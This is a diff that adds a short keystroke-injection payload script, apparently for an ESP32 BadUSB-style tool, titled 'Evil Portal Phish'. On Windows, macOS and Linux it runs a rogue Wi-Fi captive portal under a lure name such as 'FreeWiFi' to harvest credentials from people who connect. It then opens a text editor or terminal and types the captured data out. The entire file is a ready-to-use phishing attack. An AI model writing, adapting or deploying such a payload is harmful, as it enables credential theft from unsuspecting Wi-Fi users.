@@ -1,0 +1,39 @@
+NAME Evil Portal Phish
+DESCRIPTION ESP32 captive portal to harvest credentials
+CATEGORY credential
+PLATFORMS WIN,MAC,LINUX
+OPTION PORTAL_SSID FreeWiFi "Portal SSID name"
+OPTION DURATION 60000 "Portal duration (ms)"
+PLATFORM WIN
+REM Start evil portal on ESP32
+WIFI_PORTAL {{PORTAL_SSID}}
+REM Let it run for the configured duration
+WIFI_WAIT {{DURATION}}
+WIFI_STOP
+REM Type any captured creds into Notepad
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 1000
+STRINGLN === Captured Portal Data ===
+WIFI_RESULT
+PLATFORM MAC
+WIFI_PORTAL {{PORTAL_SSID}}
+WIFI_WAIT {{DURATION}}
+WIFI_STOP
+GUI SPACE
+DELAY 700
+STRING TextEdit
+ENTER
+DELAY 1400
+STRINGLN === Captured Portal Data ===
+WIFI_RESULT
+PLATFORM LINUX
+WIFI_PORTAL {{PORTAL_SSID}}
+WIFI_WAIT {{DURATION}}
+WIFI_STOP
+CTRL ALT t
+DELAY 1400
+STRINGLN echo '=== Captured Portal Data ==='
+WIFI_RESULT
